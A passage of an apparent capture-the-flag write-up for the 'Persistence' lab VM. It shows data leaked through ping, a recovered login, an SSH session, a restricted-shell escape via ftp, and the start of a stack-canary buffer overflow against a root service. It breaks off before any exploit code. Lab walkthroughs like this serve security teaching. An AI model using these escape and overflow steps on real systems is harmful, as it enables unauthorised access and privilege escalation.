+    0x0020:  ae92 0e00 6f6f 6c0a 6f6f 6c0a 6f6f 6c0a  ....ool.ool.ool.
+    0x0030:  6f6f 6c0a 6f6f 6c0a 6f6f 6c0a 6f6f 6c0a  ool.ool.ool.ool.
+    0x0040:  6f6f 6c0a 6f6f 6c0a 6f6f 6c0a 6f6f 6c0a  ool.ool.ool.ool.
+    0x0050:  6f6f 6c0a                                ool.
+19:19:17.234802 IP 172.16.246.129 &gt; 172.16.246.128: ICMP echo reply, id 45320, seq 1, length 64
+    0x0000:  4500 0054 e0b1 0000 4001 54d4 ac10 f681  E..T....@.T.....
+    0x0010:  ac10 f680 0000 80fd b108 0001 9f5b 2854  .............[(T
+    0x0020:  ae92 0e00 6f6f 6c0a 6f6f 6c0a 6f6f 6c0a  ....ool.ool.ool.
+    0x0030:  6f6f 6c0a 6f6f 6c0a 6f6f 6c0a 6f6f 6c0a  ool.ool.ool.ool.
+    0x0040:  6f6f 6c0a 6f6f 6c0a 6f6f 6c0a 6f6f 6c0a  ool.ool.ool.ool.
+    0x0050:  6f6f 6c0a                                ool.
+</code></pre>
+
+<p>So we have 2 files, one is the JPG with Salvadore Dali&rsquo;s painting, the other one looks very interesting though: sysadmin-tool. Let&rsquo;s have a look what it is and download it via web browser: <a href="http://172.16.246.128/sysadmin-tool">http://172.16.246.128/sysadmin-tool</a></p>
+
+<p>I don&rsquo;t like running unknown binaries, so let&rsquo;s have a look at strings:</p>
+
+<pre><code>root@kali:~/data# strings sysadmin-tool 
+/lib/ld-linux.so.2
+__gmon_start__
+libc.so.6
+_IO_stdin_used
+chroot
+strncmp
+puts
+setreuid
+mkdir
+rmdir
+chdir
+system
+__libc_start_main
+GLIBC_2.0
+PTRh 
+[^_]
+Usage: sysadmin-tool --activate-service
+--activate-service
+breakout
+/bin/sed -i 's/^#//' /etc/sysconfig/iptables
+/sbin/iptables-restore &lt; /etc/sysconfig/iptables
+Service started...
+Use avida:dollars to access.
+/nginx/usr/share/nginx/html/breakout
+</code></pre>
+
+<p>By the looks of it, it modifies iptables by uncommenting lines that were commented out - maybe finally TCP will be allowed! Also, avida:dollars is quite interesting, could be username:password combination for later - let&rsquo;s keep that in mind. Oh, also, seems that we have to run it with &ndash;activate-service parameter.</p>
+
+<p>Cool, back to my script, modify $CMD variable remembering to include ./ before the binary name since we are running it from local directory ($CMD=&lsquo;./sysadmin-tool &ndash;activate-service&rsquo;) and hope for the best&hellip;</p>
+
+<p>Alright, in our ping data we can see the output &ldquo;Service started Use avida:dollars to access&rdquo;. Awesome! Let&rsquo;s run nmap on again and see what&rsquo;s that new service.</p>
+
+<pre><code>root@kali:~# nmap -sV -A 172.16.246.128
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2014-09-28 19:33 EST
+Nmap scan report for 172.16.246.128
+Host is up (0.00046s latency).
+Not shown: 998 filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 5.3 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 f6:c7:fe:24:09:fa:dc:db:ea:7e:33:6a:f5:36:58:35 (DSA)
+|_  2048 37:22:da:ba:ef:05:1f:77:6a:30:6f:61:56:7b:47:54 (RSA)
+80/tcp open  http    nginx 1.4.7
+|_http-methods: No Allow or Public header in OPTIONS response (status code 405)
+|_http-title: The Persistence of Memory - Salvador Dali
+MAC Address: 00:0C:29:3A:9E:BA (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 2.6.X|3.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
+OS details: Linux 2.6.32 - 3.10
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.47 ms 172.16.246.128
+
+OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 25.80 seconds
+</code></pre>
+
+<p>Woohoo! Port 22 is open and listening! And guess what, avida:dollars is probably username:password combination that we could use to log-in.</p>
+
+<h2>Escaping from a restricted shell</h2>
+
+<pre><code>root@kali:~# ssh avida@172.16.246.128
+The authenticity of host '172.16.246.128 (172.16.246.128)' can't be established.
+RSA key fingerprint is 37:22:da:ba:ef:05:1f:77:6a:30:6f:61:56:7b:47:54.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '172.16.246.128' (RSA) to the list of known hosts.
+avida@172.16.246.128's password: 
+Last login: Mon Mar 17 17:13:40 2014 from 10.0.0.210
+-rbash-4.1$ 
+</code></pre>
+
+<p>And we have access! But what the hell is that - rbash? Restricted shell? Arrrrgh! Let&rsquo;s try to escape from it.</p>
+
+<p>First, recon - poke around and see what we can do and what we can&rsquo;t.</p>
+
+<pre><code>-rbash-4.1$ ls
+usr
+-rbash-4.1$ ls usr
+bin
+-rbash-4.1$ ls usr/bin/
+cat    df    ftp     ifconfig  ls      netstat  pstree  rmdir   top     which
+clear  diff  grep    iftop     lscpu   nice     pwd     route   touch   who
+cp     dir   gunzip  ipcalc    md5sum  passwd   rename  seq     uniq    whoami
+cut    du    gzip    kill      mkdir   ping     renice  sort    uptime
+dd     file  id      locale    nano    ps       rm      telnet  wc
+-rbash-4.1$ export -p
+declare -x G_BROKEN_FILENAMES="1"
+declare -x HISTCONTROL="ignoredups"
+declare -x HISTSIZE="1000"
+declare -x HOME="/home/avida"
+declare -x HOSTNAME="persistence"
+declare -x LANG="en_AU.UTF-8"
+declare -x LESSOPEN="|/usr/bin/lesspipe.sh %s"
+declare -x LOGNAME="avida"
+declare -x LS_COLORS="rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=01;05;37;41:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.tbz=01;31:*.tbz2=01;31:*.bz=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=01;36:*.au=01;36:*.flac=01;36:*.mid=01;36:*.midi=01;36:*.mka=01;36:*.mp3=01;36:*.mpc=01;36:*.ogg=01;36:*.ra=01;36:*.wav=01;36:*.axa=01;36:*.oga=01;36:*.spx=01;36:*.xspf=01;36:"
+declare -x MAIL="/var/spool/mail/avida"
+declare -x OLDPWD
+declare -rx PATH="/home/avida/usr/bin"
+declare -x PWD="/home/avida"
+declare -x SELINUX_LEVEL_REQUESTED=""
+declare -x SELINUX_ROLE_REQUESTED=""
+declare -x SELINUX_USE_CURRENT_RANGE=""
+declare -rx SHELL="/bin/rbash"
+declare -x SHLVL="1"
+declare -x SSH_CLIENT="172.16.246.129 60435 22"
+declare -x SSH_CONNECTION="172.16.246.129 60435 172.16.246.128 22"
+declare -x SSH_TTY="/dev/pts/0"
+declare -x TERM="xterm"
+declare -x USER="avida"
+</code></pre>
+
+<p>So, there are number of commands we can run, all interesting environment variables seem to be read only - we can&rsquo;t change PATH or SHELL, I also tried connecting via SSH and running arbitrary commands, but that didn&rsquo;t work either.</p>
+
+<pre><code>root@kali:~# ssh avida@172.16.246.128 '/bin/bash'
+avida@172.16.246.128's password: 
+rbash: /bin/bash: restricted: cannot specify `/' in command names
+</code></pre>
+
+<p>Played around with some basic stuff to see what we can do and what not, but apart from creating empty files in /tmp, we can&rsquo;t do much more - can&rsquo;t redirect output, can&rsquo;t include / in command names, quite a lot of restrictions. Also .bash_history .bashrc and .profile files had nothing of interest.</p>
+
+<p>Let&rsquo;s have a look at what commands we can run (anything in /home/avida/usr/bin) and do they offer any shell escape commands.</p>
+
+<p>First 2 that stand out are telnet and ftp. They both have capabilities of spawning a shell - let&rsquo;s try telnet:</p>
+
+<pre><code>-rbash-4.1$ telnet
+telnet&gt; !/bin/bash
+rbash: /bin/bash: restricted: cannot specify `/' in command names
+</code></pre>
+
+<p>Doesn&rsquo;t work - it tried to invoke a subshell utilising the current shell. How about <a href="ftp:">ftp:</a></p>
+
+<pre><code>-rbash-4.1$ ftp
+ftp&gt; !/bin/bash
+bash-4.1$ 
+</code></pre>
+
+<p>Haaaaaaaaa! We have unrestricted shell! So now we just need to find privilege escalation point and we&rsquo;re done - we should be really close&hellip; but that&rsquo;s where the fun just begins.</p>
+
+<h2>Privilege escalation via buffer overflow vulnerability</h2>
+
+<p>First of all, let&rsquo;s update PATH to include standard locations of the binaries (we&rsquo;re still having the same PATH variable as in the restricted shell). I also like to set up some aliases:</p>
+
+<pre><code>bash-4.1$ PATH=/bin:/usr/bin:/usr/local/bin
+bash-4.1$ alias ls='ls -al --color'
+bash-4.1$ alias l='ls'
+</code></pre>
+
+<p>Cool, let&rsquo;s see what do we have here that we could utilise. First thing&rsquo;s first - sudo!</p>
+
+<pre><code>bash-4.1$ sudo -l
+[sudo] password for avida: 
+Sorry, user avida may not run sudo on persistence.
+</code></pre>
+
+<p>Ah, that sucks. Keep poking around, is there anything interesting running&hellip;</p>
+
+<pre><code>bash-4.1$ ps -ef
+UID        PID  PPID  C STIME TTY          TIME CMD
+root         1     0  0 12:50 ?        00:00:01 /sbin/init
+root         2     0  0 12:50 ?        00:00:00 [kthreadd]
+root         3     2  0 12:50 ?        00:00:00 [migration/0]
+root         4     2  0 12:50 ?        00:00:00 [ksoftirqd/0]
+root         5     2  0 12:50 ?        00:00:00 [migration/0]
+root         6     2  0 12:50 ?        00:00:00 [watchdog/0]
+root         7     2  0 12:50 ?        00:00:00 [events/0]
+root         8     2  0 12:50 ?        00:00:00 [cgroup]
+root         9     2  0 12:50 ?        00:00:00 [khelper]
+root        10     2  0 12:50 ?        00:00:00 [netns]
+root        11     2  0 12:50 ?        00:00:00 [async/mgr]
+root        12     2  0 12:50 ?        00:00:00 [pm]
+root        13     2  0 12:50 ?        00:00:00 [sync_supers]
+root        14     2  0 12:50 ?        00:00:00 [bdi-default]
+root        15     2  0 12:50 ?        00:00:00 [kintegrityd/0]
+root        16     2  0 12:50 ?        00:00:00 [kblockd/0]
+root        17     2  0 12:50 ?        00:00:00 [kacpid]
+root        18     2  0 12:50 ?        00:00:00 [kacpi_notify]
+root        19     2  0 12:50 ?        00:00:00 [kacpi_hotplug]
+root        20     2  0 12:50 ?        00:00:00 [ata_aux]
+root        21     2  0 12:50 ?        00:00:00 [ata_sff/0]
+root        22     2  0 12:50 ?        00:00:00 [ksuspend_usbd]
+root        23     2  0 12:50 ?        00:00:00 [khubd]
+root        24     2  0 12:50 ?        00:00:00 [kseriod]
+root        25     2  0 12:50 ?        00:00:00 [md/0]
+root        26     2  0 12:50 ?        00:00:00 [md_misc/0]
+root        27     2  0 12:50 ?        00:00:00 [linkwatch]
+root        28     2  0 12:50 ?        00:00:00 [khungtaskd]
+root        29     2  0 12:50 ?        00:00:00 [kswapd0]
+root        30     2  0 12:50 ?        00:00:00 [ksmd]
+root        31     2  0 12:50 ?        00:00:00 [aio/0]
+root        32     2  0 12:50 ?        00:00:00 [crypto/0]
+root        37     2  0 12:50 ?        00:00:00 [kthrotld/0]
+root        38     2  0 12:50 ?        00:00:00 [pciehpd]
+root        40     2  0 12:50 ?        00:00:00 [kpsmoused]
+root        41     2  0 12:50 ?        00:00:00 [usbhid_resumer]
+root        72     2  0 12:50 ?        00:00:00 [kstriped]
+root       144     2  0 12:50 ?        00:00:00 [scsi_eh_0]
+root       145     2  0 12:50 ?        00:00:00 [scsi_eh_1]
+root       152     2  0 12:50 ?        00:00:00 [mpt_poll_0]
+root       153     2  0 12:50 ?        00:00:00 [mpt/0]
+root       154     2  0 12:50 ?        00:00:00 [scsi_eh_2]
+root       275     2  0 12:50 ?        00:00:00 [kdmflush]
+root       277     2  0 12:50 ?        00:00:00 [kdmflush]
+root       294     2  0 12:50 ?        00:00:00 [jbd2/dm-0-8]
+root       295     2  0 12:50 ?        00:00:00 [ext4-dio-unwrit]
+root       376     1  0 12:50 ?        00:00:00 /sbin/udevd -d
+root       557     2  0 12:50 ?        00:00:00 [vmmemctl]
+root       692     2  0 12:50 ?        00:00:00 [jbd2/sda1-8]
+root       693     2  0 12:50 ?        00:00:00 [ext4-dio-unwrit]
+root       727     2  0 12:50 ?        00:00:00 [kauditd]
+root       878     2  0 12:50 ?        00:00:00 [flush-253:0]
+root       908     1  0 12:50 ?        00:00:00 /sbin/dhclient -q -lf /var/lib/d
+root       949     1  0 12:50 ?        00:00:00 auditd
+root       965     1  0 12:50 ?        00:00:00 /sbin/rsyslogd -i /var/run/syslo
+root      1017     1  0 12:50 ?        00:00:00 /usr/sbin/sshd
+root      1093     1  0 12:50 ?        00:00:00 /usr/libexec/postfix/master
+postfix   1100  1093  0 12:50 ?        00:00:00 qmgr -l -t fifo -u
+root      1103     1  0 12:50 ?        00:00:00 crond
+root      1114     1  0 12:50 ?        00:00:00 /usr/local/bin/wopr
+root      1117     1  0 12:50 ?        00:00:00 php-fpm: master process (/etc/ph
+root      1121     1  0 12:50 ?        00:00:00 nginx: master process /usr/sbin/
+nginx     1122  1121  0 12:50 ?        00:00:18 nginx: worker process
+nginx     1124  1117  0 12:50 ?        00:00:00 php-fpm: pool www
+nginx     1125  1117  0 12:50 ?        00:00:00 php-fpm: pool www
+nginx     1126  1117  0 12:50 ?        00:00:00 php-fpm: pool www
+nginx     1127  1117  0 12:50 ?        00:00:00 php-fpm: pool www
+nginx     1128  1117  0 12:50 ?        00:00:00 php-fpm: pool www
+root      1131     1  0 12:50 tty1     00:00:00 /sbin/mingetty /dev/tty1
+root      1133     1  0 12:50 tty2     00:00:00 /sbin/mingetty /dev/tty2
+root      1137     1  0 12:50 tty3     00:00:00 /sbin/mingetty /dev/tty3
+root      1141     1  0 12:50 tty4     00:00:00 /sbin/mingetty /dev/tty4
+root      1142   376  0 12:50 ?        00:00:00 /sbin/udevd -d
+root      1144   376  0 12:50 ?        00:00:00 /sbin/udevd -d
+root      1145     1  0 12:50 tty5     00:00:00 /sbin/mingetty /dev/tty5
+root      1147     1  0 12:50 tty6     00:00:00 /sbin/mingetty /dev/tty6
+nginx     1642  1117  0 13:53 ?        00:00:00 php-fpm: pool www
+nginx     1643  1117  0 13:53 ?        00:00:00 php-fpm: pool www
+postfix   1931  1093  0 14:30 ?        00:00:00 pickup -l -t fifo -u
+root      2521  1017  0 15:32 ?        00:00:00 sshd: avida [priv]
+avida     2525  2521  0 15:32 ?        00:00:00 sshd: avida@pts/0
+avida     2526  2525  0 15:32 pts/0    00:00:00 -rbash
+avida     2612  2526  0 15:39 pts/0    00:00:00 ftp
+avida     2613  2612  0 15:40 pts/0    00:00:00 /bin/bash
+avida     2710  2613  0 15:53 pts/0    00:00:00 ps -ef
+</code></pre>
+
+<p>Hmmmm, seems most of the standard stuff&hellip; but hang on - /usr/local/bin/wopr - what&rsquo;s that?!</p>
+
+<pre><code>bash-4.1$ ls /usr/local/bin/wopr 
+-rwxr-xr-x. 1 root root 7878 Apr 28 07:43 /usr/local/bin/wopr
+</code></pre>
+
+<p>Promising! Running as root. Let&rsquo;s try to run it again:</p>
+
+<pre><code>bash-4.1$ /usr/local/bin/wopr 
+bind: Address already in use
+</code></pre>
+
+<p>Cool! Let&rsquo;s see what addresses are in use then - must be some kind of a server running&hellip;</p>
+
+<pre><code>bash-4.1$ netstat -ant
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address               Foreign Address             State      
+tcp        0      0 0.0.0.0:3333                0.0.0.0:*                   LISTEN      
+tcp        0      0 127.0.0.1:9000              0.0.0.0:*                   LISTEN      
+tcp        0      0 0.0.0.0:80                  0.0.0.0:*                   LISTEN      
+tcp        0      0 0.0.0.0:22                  0.0.0.0:*                   LISTEN      
+tcp        0      0 127.0.0.1:25                0.0.0.0:*                   LISTEN      
+tcp        0      0 172.16.246.128:22           172.16.246.129:60442        ESTABLISHED 
+tcp        0      0 :::22                       :::*                        LISTEN      
+tcp        0      0 ::1:25                      :::*                        LISTEN      
+</code></pre>
+
+<p>Alright, let&rsquo;s connect to port 3333.</p>
+
+<pre><code>bash-4.1$ nc localhost 3333
+[+] hello, my name is sploitable
+[+] would you like to play a game?
+&gt; yes
+[+] yeah, I don't think so
+[+] bye!
+</code></pre>
+
+<p>So we have an exploitable (apparently) server listening locally that accepts user input. Tried few inputs like &ldquo;help&rdquo;, &ldquo;options&rdquo;, &ldquo;usage&rdquo;, but they all didn&rsquo;t work - seems that it doesn&rsquo;t really do anything.</p>
+
+<p>But, since it accepts user input and doesn&rsquo;t seem to sanitize its length, that sounds like a possibility of a buffer overflow vulnerability!</p>
+
+<pre><code>bash-4.1$ python -c '"A" * 30000' | nc localhost 3333
+[+] hello, my name is sploitable
+[+] would you like to play a game?
+&gt; [+] yeah, I don't think so
+[+] bye!
+</code></pre>
+
+<p>Let&rsquo;s see what the binary has to tell us about itself.</p>
+
+<pre><code>bash-4.1$ file /usr/local/bin/wopr 
+/usr/local/bin/wopr: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.18, not stripped
+bash-4.1$ strings /usr/local/bin/wopr 
+/lib/ld-linux.so.2
+__gmon_start__
+libc.so.6
+_IO_stdin_used
+socket
+exit
+htons
+perror
+puts
+fork
+__stack_chk_fail
+listen
+memset
+__errno_location
+bind
+read
+memcpy
+setsockopt
+waitpid
+close
+accept
+__libc_start_main
+setenv
+write
+GLIBC_2.4
+GLIBC_2.0
+PTRhP
+[^_]
+[+] yeah, I don't think so
+socket
+setsockopt
+bind
+[+] bind complete
+listen
+/tmp/log
+TMPLOG
+[+] waiting for connections
+[+] logging queries to $TMPLOG
+accept
+[+] got a connection
+[+] hello, my name is sploitable
+[+] would you like to play a game?
+[+] bye!
+</code></pre>
+
+<p>Sweet, it&rsquo;s not packed so we can actually see some stuff. Couple things that stand out:</p>
+
+<ul>
+<li>socket</li>
+<li>fork</li>
+<li>memcpy</li>
+<li>setenv</li>
+<li>TMPLOG</li>
+<li>/tmp/log</li>
+</ul>
+
+
+<p>From that, we can deduct in a very high level what the binary may be doing - server listening for connections, upon new connection forks a new process and obtains user input via memcpy function. There&rsquo;s also setenv, that probably sets TMPLOG variable to /tmp/log. Unfortunately, /tmp/log doesn&rsquo;t exist so it doesn&rsquo;t provide any useful information&hellip; at least not at the moment!</p>
+
+<p>Alright, let&rsquo;s do some more analysis and testing on the binary itself. I want to be able to run it in my own environment and see how it behaves, debug and see what I can do with it. For this I&rsquo;ll need a very close replica of the environment it&rsquo;s already running on, so I went ahead and downloaded Centos 6.5 with the same kernel and set-up another VM.</p>
+
+<pre><code>bash-4.1$ uname -a
+Linux persistence 2.6.32-431.5.1.el6.i686 #1 SMP Tue Feb 11 21:56:33 UTC 2014 i686 i686 i386 GNU/Linux
+bash-4.1$ cat /etc/*release
+CentOS release 6.5 (Final)
+</code></pre>
+
+<p>Having all that, now I needed wopr binary. Since I still can&rsquo;t copy stuff across due to firewall restrictions, without messing around too much I thought of this quick and nasty way of copying it across - simply copying hex value of it and recreating it on my local CentOS VM.</p>
+
+<pre><code>bash-4.1$ xxd -p /usr/local/bin/wopr 
+7f454c460101010000000000000000000200030001000000c08604083400
+0000801100000000000034002000090028001e001b000600000034000000
+348004083480040820010000200100000500000004000000030000005401
+000054810408548104081300000013000000040000000100000001000000
+000000000080040800800408c00d0000c00d000005000000001000000100
+0000140f0000149f0408149f0408440100004c0100000600000000100000
+02000000280f0000289f0408289f0408c8000000c8000000060000000400
+000004000000680100006881040868810408440000004400000004000000
+0400000050e57464200d0000208d0408208d040824000000240000000400
+00000400000051e574640000000000000000000000000000000000000000
+060000000400000052e57464140f0000149f0408149f0408ec000000ec00
+000004000000010000002f6c69622f6c642d6c696e75782e736f2e320000
+                     ...(truncated)...
+</code></pre>
+
+<p>Copy-pase output into a text file called wopr.hex on local CentOS and recreate binary from hex:</p>
+
+<pre><code>[knaps@localhost ~]$ cat wopr.hex | xxd -r -p &gt; wopr
+</code></pre>
+
+<p>Alright, now we have the binary on our local CentOS and we can successfully run it, debug it and do whatever we like with it! Unfortunately CentOS didn&rsquo;t come with nc and gdb by default, so needed to download it with yum.</p>
+
+<p>Ok, let&rsquo;s run it and see is there any more information displayed on the server side that could be useful in our research. Run the server, connect to it and provide some random size input:</p>
+
+<pre><code>[knaps@localhost ~]$ chmod 755 wopr
+[knaps@localhost ~]$ ./wopr
+[+] bind complete
+[+] waiting for connections
+[+] logging queries to $TMPLOG
+</code></pre>
+
+<pre><code>[knaps@localhost ~]$ python -c 'print "A" * 500' | nc localhost 3333
+</code></pre>
+
+<p>Sweet, some interesting stuff! Look at this:</p>
+
+<pre><code>...(truncated)...
+
+[+] got a connection
+*** stack smashing detected ***: ./wopr terminated
+======= Backtrace: =========
+/lib/libc.so.6(__fortify_fail+0x4d)[0x727f4d]
+/lib/libc.so.6(+0xfcefa)[0x727efa]
+./wopr[0x80487dc]
+[0x41414141]
+======= Memory map: ========
+001c3000-001e0000 r-xp 00000000 08:02 394237     /lib/libgcc_s-4.4.7-20120601.so.1
+001e0000-001e1000 rw-p 0001d000 08:02 394237     /lib/libgcc_s-4.4.7-20120601.so.1
+
+...(truncated)...
+</code></pre>
+
+<p>Looks like we have overwritten return address with &ldquo;A&#8221;s (0x41414141), muahaha!.</p>
+
+<p>But wait, there&rsquo;s a problem - what is this crap?!</p>
+
+<pre><code>*** stack smashing detected ***: ./wopr terminated
+</code></pre>
+
+<p>After some research, it looks like it&rsquo;s a Stack Smashing Protection (SSP) and here we are introduced to the first hurdle - a canary.</p>
+
+<p>So what&rsquo;s a canary? It&rsquo;s simply a value placed on a stack before the return address that is checked after returning from a function. If it&rsquo;s changed, that means someone was trying to overflow the buffer and get to the return address, so the program will throw an exception and terminate. Otherwise, it will happily run.</p>
+
+<p>So what we&rsquo;ll need to do? Overwrite a canary with its original value while overflowing our way to return address! Yeah&hellip; but there&rsquo;s a problem - canary is a completely random value, so good luck, it will be pretty much impossible to come up with a winning combination in a reasonable time. We&rsquo;ll need to come up with something more clever than that&hellip;</p>
+
+<p>Let&rsquo;s run gdb and disasemble our program. Without pasting in the whole input here, after quick high level analysis we can see that the server creates a socket and listens for new connections, when new connection comes in, new process is forked and then get_reply command invoked that contains canary checking code and vulnerable function memcpy. See snippets below:</p>
+
+<pre><code>...(truncated)...
+
+   0x08048821 &lt;+67&gt;:    movl   $0x0,0x8(%esp)
+   0x08048829 &lt;+75&gt;:    movl   $0x1,0x4(%esp)
+   0x08048831 &lt;+83&gt;:    movl   $0x2,(%esp)
+   0x08048838 &lt;+90&gt;:    call   0x804860c &lt;socket@plt&gt;
+
+...(truncated)...
+
+   0x08048a09 &lt;+555&gt;:   call   0x804867c &lt;fork@plt&gt;
+
+...(truncated)...
+
+   0x08048ad1 &lt;+755&gt;:   call   0x8048774 &lt;get_reply&gt;
+
+...(truncated)...
+
+   0x0804878c &lt;+24&gt;:    mov    %gs:0x14,%eax
+   0x08048792 &lt;+30&gt;:    mov    %eax,-0x4(%ebp)                         =====&gt;&gt;  Setting the canary
+
+...(truncated)...
+
+   0x080487ab &lt;+55&gt;:    call   0x804861c &lt;memcpy@plt&gt;
+
+...(truncated)...
+
+   0x080487cb &lt;+87&gt;:    mov    -0x4(%ebp),%eax
+   0x080487ce &lt;+90&gt;:    xor    %gs:0x14,%eax                           =====&gt;&gt;  Checking the canary
+   0x080487d5 &lt;+97&gt;:    je     0x80487dc &lt;get_reply+104&gt;
+   0x080487d7 &lt;+99&gt;:    call   0x804865c &lt;__stack_chk_fail@plt&gt;
+   0x080487dc &lt;+104&gt;:   leave  
+   0x080487dd &lt;+105&gt;:   ret    
+
+...(truncated)...
+</code></pre>
+
+<p>Wait, wait, wait&hellip; new child processes are created with fork! See this quote from man pages:</p>
+
+<pre><code>fork() creates a new process by duplicating the calling process. The new process, referred to as the child, is an exact duplicate of the calling process (...)
+</code></pre>
+
+<p>This includes canaries! Forked process will have exactly the same canary as a parent process&hellip; what does it give us? Well, since it&rsquo;s a server and constantly accepting new connections (therefore forking new processes with exactly the same canary) we can guess the canary! And to make it a lot quicker, we can try to guess it byte by byte in order to speed up the process. Sweet!</p>
+
+<p>There are few bits missing before we can attempt guessing the canary - we need to know the size of a buffer, offset of a canary and of a return address. Canary sits immediatelly before the saved base pointer and return address and is 4 bytes long. See below illustration of a stack:</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>.
+</span><span class='line'>    &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;
+</span><span class='line'>    |                |
+</span><span class='line'>    |                |
+</span><span class='line'>    |     Buffer     |   x bytes
+</span><span class='line'>    |                |
+</span><span class='line'>    |                |
+</span><span class='line'>    &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;
+</span><span class='line'>    |     Canary     |   4 bytes
+</span><span class='line'>    &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;
+</span><span class='line'>    |  Base pointer  |   4 bytes
+</span><span class='line'>    &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;
+</span><span class='line'>    | Return address |   4 bytes
+</span><span class='line'>    &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;
+</span><span class='line'>    |       &hellip;      |</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Alright, let&rsquo;s get to work. To find all necessary offsets we&rsquo;ll use metasploit tool to generate unique pattern of characters of a given length. This way we&rsquo;ll be able to figure out where exactly in the string given bytes are that were used to overwrite return address.</p>
+
+<pre><code>root@kali:/usr/share/metasploit-framework/tools# ./pattern_create.rb 500
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
+</code></pre>
+
+<p>Now let&rsquo;s paste it as an input to our server:</p>
+
+<pre><code>[knaps@localhost ~]$ nc localhost 3333
+[+] hello, my name is sploitable
+[+] would you like to play a game?
